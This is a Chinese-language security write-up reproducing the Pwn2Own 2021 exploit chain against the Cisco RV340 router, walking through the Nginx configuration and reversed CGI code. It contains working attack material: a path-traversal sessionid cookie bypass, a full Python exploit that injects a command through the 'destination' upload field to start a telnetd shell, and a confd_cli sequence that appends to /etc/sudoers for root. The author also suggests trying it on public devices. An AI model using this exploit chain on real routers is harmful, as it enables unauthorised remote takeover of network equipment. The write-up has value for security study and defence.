0x01 2021pwn2own中的RV340
=======================

pwn2own中展示的方法是利用多个个cve漏洞，完成身份绕过，命令执行，提权的过程，目标机器是Cisco RV340。  
出现漏洞的版本在1.0.3.24以前，所以我下载了1.0.3.22版本的固件进行复现学习。

这次学习Cisco路由器，旨在理清思科路由器和之前研究的区别和框架。

0x02 攻击链分析
==========

接触的设备RV340使用的是Nginx作为web服务，配置文件位于/etc/nginx中，web根目录在www目录下。

在这样的分析中，首先查看的还是web的服务配置，查看Nginx的配置文件。关注配置文件中的nginx.conf，fastcgi\_params，以及conf.d中的web.conf，web.upload.conf这几个较为关键的配置文件。

首先学习Nginx的配置文件构成，在主配置文件nginx.conf文件中，配置内容分为三块，分别是全局块，events块，http块。在http块中，又包含多个server块。每个server块中又可以包含server全局块和多个location块。如此环环嵌套，在各个作用域发挥作用。

一般来说，高一层级的块可以作用在其包含的所有块中。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c47f6c458af0174add5b4c47314c82dac261503c.png)

在RV340的配置中，定义了如上内容，更多的server块内容在sites-enabled下作为单个文件存在，具体不深入探究，upstream是负载均衡，一般来说多个server后面还有权重，但是这里只有一个port，也就没有配置权重的必要。  
整个nginx配置了五个大的server，分别为rest，web-lan，web-rest-lan，web-rest-wan，web-wan。

每个server中包含了若干include指令，拿rest来说。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dd7c246e888b1e7f31b513f08ef87333a6f54529.png)  
在这些conf中包含了若干location。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3f2a95114d567252684a5bac28a697d3fbf93641.png)

按照理解，每个server都相当于是一台虚拟主机，而其中的location处理虚拟主机接收到的各类请求字符串，对server\_name以外的字符串进行匹配。

location的语法结构为`location [ = | ~ | ~* | ^~ ] uri { ... }`  
其中uri可以含有正则表达式，\[\]中的，是可选项，用来改变和uri的匹配方式。

- “=”，用于标准uri前，要求请求字符串与uri严格匹配。如果已经匹配成功，就停止继续向下搜索并立即处理此请求。
- “^～”，用于标准uri前，要求Nginx服务器找到标识uri和请求字符串匹配度最高的location后，立即使用此location处理请求，而不再使用location块中的正则uri和请求字符串做匹配。
- “～”，用于表示uri包含正则表达式，并且区分大小写。
- “～`*`”，用于表示uri包含正则表达式，并且不区分大小写。注意如果uri包含正则表达式，就必须要使用“～”或者“～\*”标识。 > 我们知道，在浏览器传送URI时对一部分字符进行URL编码，比如空格被编码为“%20”，问号被编码为“%3f”等。“～”有一个特点是，它对uri中的这些符号将会进行编码处理。比如，如果location块收到的URI为“/html/%20/data”，则当Nginx服务器搜索到配置为“～ /html/ /data”的location时，可以匹配成功。

在web.conf中和web.upload中定义了一些访问的url，关注到web.upload这一较为敏感的内容。

```c
location /upload {
    set $deny 1;

        if (-f /tmp/websession/token/$cookie_sessionid) {
                set $deny "0";
        }

        if ($deny = "1") {
                return 403;
        }

    upload_pass /form-file-upload;
    upload_store /tmp/upload;
    upload_store_access user:rw group:rw all:rw;
    upload_set_form_field $upload_field_name.name "$upload_file_name";
    upload_set_form_field $upload_field_name.content_type "$upload_content_type";
    upload_set_form_field $upload_field_name.path "$upload_tmp_path";
    upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
    upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";
    upload_pass_form_field "^.*$";
    upload_cleanup 400 404 499 500-505;
    upload_resumable on;
}
```

\\$deny为1即可完成403跳转，条件就是`/tmp/websession/token/$cookie_sessionid`存在，然而对于\\$cookie\_sessionid，这个变量，似乎没有太多的安全要素在里面。  
只需要让目录穿越到一个存在的文件即可绕过这个检查。  
即设置`sessionid=../../../../../../../../etc/passwd`。  
此时请求upload，会返回400，而如果文件不存在则返回403，这就是CVE-2022-20705漏洞。（这里指的是请求头不全时，返回400）  
该漏洞造成的威胁是任意的文件上传，因为可以发现这里对文件上传的文件也是没有检测的（CVE-2022-20709)

绕过验证之后，请求给到对应的cgi，可以对upload.cgi进行逆向分析，稍做分析之后发现，第一次的绕过还不算，在cgi中对sessionid还有第二次校验。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-45608f0b63d2f66515f855993af21d6a5ab2a933.png)

图中的目标函数可以说是最终执行的目标，在执行这两个函数之前，前面有很多的判断，第二条就是我们分析的upload，第一条是另外的路径，在rest.url.conf中可以看到其约束。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6c1595b61064429c961dbced3f90fc893464fcea.png)

必须要有authorization选项才可以。其余的之类的条件不用管，都可以在http包中伪造，如果是第一条url，则进入sub\_124B0函数。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-2f53259bd77915db790cc873f4bc0a7373344cdf.png)

在这条路径中，闭合得当可以rce。  
第二个函数sub\_12684中，同样的控制cookie得当，也可以RCE。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d163581b65e66069502ee2f8321a62cd5f76715d.png)

这里就是突破的第二步，CVE-2022-20707，最后就是提升权限为root，最终提权使用的是confd\_cli命令（2022-20701）。  
以上提到的CVE号可能不是太准确，因为找到的资料都是一个大类，[思科官网](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-smb-mult-vuln-KA9PK6D.html)中有记载，RV设备爆出来很多连CVE号码的漏洞，可能是其中的某一个。

0x03 从分析到利用
===========

绕过Nginx配置
---------

在分析中基本上都讲到了，分析中举出来的例子算是一个小例子，实际上在conf配置文件中，几乎对于所有的authorization和sessionid都可以用到类似的绕过，执行一些意料之外的事情。  
基础条件就是authorization不为空，session文件不为空（基本上就是利用根目录下一定存在的文件）

`payload = http_req+"sessionid=../../../../../../../../etc/passwd"+xxxx`

二次绕过后的RCE
---------

具体的rce形成已经知道了，接下来就是好好说道一下利用过程中需要解决的认证问题，Cisco的代码还算规整（diss某httpd），逻辑也比较清晰。

程序从环境变量中取出一些相关的头部字段，从content\_type来看，这次请求是http的boundary文件上传。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-81b482a21700e2ddfcd74bb0f7d353b26ba892aa.png)

其中一些str和buf之间的操作看名字应该就知道是什么意思，其中设计到boundary的格式操作，也不需要深入探究，按照标准格式，到时候一抓包改关键位置就行。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fe0bd35724f9bccf95ef1cdb122288279ab6564f.png)

从数据包中取出关键字，如果设置了http-cookie则通过strstr获得sessionid后面的东西，同时可以有多个session\_id因为使用了for循环，利用分号匹配了所有的cookie，只要是有session\_id就进行操作，去最后的session\_id为有效id。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3bce84bbdf0b6146a5b9b8ad89a9cce458ba13ca.png)

通过filename获得相应的key然后去sub\_115D0函数进行更一步的操作。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-41bf505b2d353e20e3e735369a901bbc583b96e3.png)

后文中，只有v21返回值为0才可以到最后一步，函数的第一个参数是pathparam，第二个参数是filepath，第三个参数是filename

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e2cc9868efb6d6488e2e198d5291536861598412.png)

通过fileparam决定v8，检查filepath是否存在，检查filname是否含有非法字符，最后system调用mv函数进行操作，a2必须是合法文件路径，第二个参数已经固定，第三个参数有了正则waf，似乎system看起来没有办法逃逸引号，函数返回system的执行结果，继续运行。

这里的逻辑也是有问题的，因为可以明显的感觉到这个，mv的执行太简单了，回去再看一遍发现对filename过滤，但是允许.(点号)存在，所以可以穿越目录，任意文件移动（CVE-2022-20711)。

在接下来就是两个可能rce的函数了，第一个不给予考虑，一个waf全当下来了，第二个可以考虑一下，里面的json\_obj\_to\_str可以看看，查找该函数，发现函数存在于libjson-c.so文件中。

```c
int __fastcall json_object_to_json_string(int a1)
{
  return j_json_object_to_json_string_ext(a1, 1);
}
```

奇怪的是是一个有参数的函数，可能IDA没有识别出来，导致该函数没有参数。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f9cc853bafdfbb9727b02a75b4a585888aa5ed04.png)

查看汇编知道，参数来源于R0，也就是前面的非0判断那个变量，修改函数原型后显示正常。

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dfdbef381f9ba729f49fce409d43f3fb58abedb7.png)

V14来源于a4判断之后的函数返回值。  
这些函数大都是创建json对象，然后拼接之类的，拿`sub_117E0(a2, a5, a3);`函数举个例子。

```c
int __fastcall sub_117E0(int a1, int a2, int a3)
{
  [.........]
  v3 = a2 == 0;
  if ( a2 )
    v3 = a1 == 0;
  if ( v3 )
    return 0;
  if ( !a3 )
    return 0;
  v7 = json_object_new_object(a1);
  v8 = json_object_new_object(v7);
  v9 = json_object_new_object(v8);
  v10 = json_object_new_object(v9);
  v11 = json_object_new_object(v10);
  v23 = json_object_new_object(v11);
  v24 = StrBufCreate(v23, v12, v13);
  StrBufSetStr(v24, (int)"FILE://Firmware/");
  StrBufAppendStr(v24, a2);
  v14 = json_object_new_string("2.0");
  json_object_object_add(v7, "jsonrpc", v14);
  v15 = json_object_new_string("action");
  json_object_object_add(v7, "method", v15);
  json_object_object_add(v7, "params", v9);
  v16 = json_object_new_string("file-copy");
  json_object_object_add(v9, "rpc", v16);
  json_object_object_add(v9, "input", v8);
  v17 = json_object_new_string("firmware");
  json_object_object_add(v8, "fileType", v17);
  json_object_object_add(v8, "source", v10);
  v18 = StrBufToStr(v24);
  v19 = json_object_new_string(v18);
  json_object_object_add(v10, "location-url", v19);
  json_object_object_add(v8, "destination", v11);
  v20 = json_object_new_string(a1);
  json_object_object_add(v11, "firmware-state", v20);
  json_object_object_add(v8, "firmware-option", v23);
  v21 = json_object_new_string(a3);
  json_object_object_add(v23, "reboot-type", v21);
  StrBufFree(&v24);
  return v7;
}
```

返回值为v7，根据a1创建对象，然后添加jsonrpc，添加method，添加params最后返回v7，简而言之，就是在第一个参数的基础上在后面拼接若干东西，形成一个json对象，在后续的`json_object_to_json_string(v14);`函数中转化该对象为string，然后传入command执行。

所以我们只需要构造一个逃逸单引号的destination就可以了。（`sub_117E0`函数的第一个参数是destination）

总结起来，rce的条件就是：

1. 各类参数齐全，filename符合格式
2. 任意文件移动必须返回0，即filename不含有特殊字符，filepath是合法路径
3. destination闭合单引号  
    利用起来也不是特别困难


提权  
提权利用上也有很多漏洞，这里选择的是其中的confd指令提权，利用通过`confd`以特权运行的 Cisco `root`，获得系统执行root命令的权限，主要是利用Web UI 通过本地绑定的套接字与 confd 服务器进行通信。

> It is also possible to communicate with `confd` and issue commands using the userspace application `confd_cli`. During our research, we noticed that the confd daemon provides commands to read and write files with the `file show` and `append` commands.  
> confd本身就提供了读写文件的操作，下面是在某博客看到的一个提权demo。

```shell
$ echo 'www-data ALL=(ALL) NOPASSWD: ALL' > /tmp/www-data-sudo
$ /usr/bin/confd_cli -U 0 -G 0 -u root -g root
root connected from 127.0.0.1 using console on cisco-router91D57F
root@cisco-router91D57F> file show /tmp/www-data-sudo | append /etc/sudoers
file show /tmp/www-data-sudo | append /etc/sudoers
[ok][2021-10-11 09:43:01]
root@router91D57F> exit
exit
$ sudo /bin/sh
sudo /bin/sh
BusyBox v1.23.2 (2021-06-14 02:21:16 IST) built-in shell (ash)
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

0x04 验证 &amp; POC
=================

qemu模拟启动虚拟环境。arm小端，使用的是armhf，在qemu模拟的系统中，切换chroot和挂载dev poc之后，按照以下指令启动nginx服务即可，比httpd之类的方便一点。

```bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

具体的可以看nginx和confd启动需要的依赖。

这里遇到了一个bug，启动服务的时候，有很多东西显示没有，看了一下，发现我的var软连接指向了/dev/null？？？

然后找了一些资料，发现是binwalk在解压的时候，自动把软连接重置为了null。所以在这里对binwalk需要做一个修改，在`binwalk/modules/extractor.py`文件中。

有一个最后三行的if判断（if not xxxx）  
![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-120a1c060ccc7553c97405a0d516afe2b0445dac.png)

把那里的if改为`if 0 and not xxxxx`

然后重新编译binwalk再去提取就ok了（复现完毕别忘记改回来，怕出问题）

一直到命令执行，实际上一个脚本就可以一把梭，关注点在于第一个sessionid和第二个sessionid的伪造，以及任意文件移动的绕过和destination的设置。

```python
from pwn import *
import base64 as b64

IP = "192.168.250.173"
PORT = 80
p = remote(IP.PORT)

text = "login".encode('utf-8')
fake_session = "sessionid=../../../../../../etc/passwd;sessionid=" + b64.b64encode(text).decode('utf-8') + ";"

body = """------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="sessionid"

EU6DJKEIWO
------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="pathparam"

Firmware
------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="fileparam"

file001
------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="destination"

x';/usr/sbin/telnetd -p 8888 -d /bin/sh
------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="option"

x
------WebKitFormBoundaryz6gIo5kcTkAlkCwX
Content-Disposition: form-data; name="file"; filename="1.img"
Content-Type: application/octet-stream

1111
------WebKitFormBoundaryz6gIo5kcTkAlkCwX--

"""

payload = b"POST /upload HTTP/1.1\r\n"
payload += b"Host: %s\r\n"%IP
payload += b"Accept: application/json, text/plain, */*\r\n"
payload += b"optional-header: header-value\r\n"
payload += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\n"
payload += b"Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz6gIo5kcTkAlkCwX\r\n"
payload += b"Content-Length: %s\r\n"%(str(len(body)))
payload += b"Origin: http://192.168.250.173\r\n"
payload += b"Referer: http://192.168.250.173/index.html\r\n"
payload += b"Accept-Encoding: gzip, deflate\r\n"
payload += b"Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
payload += b"Cookie: %s\r\n"%fake_session
payload += b"Connection: close\r\n"
payload += b"\r\n"
payload += body.encode('utf-8')

p.send(payload)

p.interactive()
```

提权就很简单了，具体的原理不讲了，类似于sudo这类的提权，按照上面的demo，一步一步操作就可以了。

起服务失败的也可以在公网上找一台设备，试一试（拒绝违法行为）也可以本地调试，本地调试cgi的方法可以参考《家用路由器的0day挖掘》，主要是在启动qemu-static之前，先把环境变量设置好，这里不太好处理的是main函数里面的一个pharase函数，加上漏洞逻辑清晰，所以不太建议本地调试，找个模拟环境打一下，开了telnetd就行了。

0x05 总结
=======

在突破到控制到提权的过程中，利用的链子中存在很多漏洞，在思科官网可以看到，此次的pwn2own对Cisco路由器也是花样很多。  
除了以上的方法还有很多的利用可以学习，大概的CVE编号都在2022-20700--2022-20710左右。还有一些师傅利用device更新之类的方法，也是非常有意思。  
再次总结上面的利用：

1. conf配置文件存在session绕过和任意文件上传，利用这个可以过掉第一部分的验证（只需要伪造session即可）
2. 第二次session验证依然存在问题，验证校验了session的内容，即只能存在数字字母（base64）但是在获取session的时候允许多个session的出现，用分号隔开取最后一个有效，这就导致我们可以输入多个session，绕过2此验证。
3. 之后有一个任意文件移动，这个可以和任意文件上传一起利用，也可以绕过即可，主要注意filname，filepath等参数的合法性。
4. Rce，输入的destination逃逸引号即可
5. 提权利用的是执行confd时候的root权限，且可以创建移动文件，精心构造的输入和show等指令可以让用户获得root权限。

总的来说复现感觉很好，Cisco提供的Nginx和详细的资料让模拟环境变得较为简单，poc也是在模拟环境下一手编写，从搭建环境到拿到root权限的感觉很好。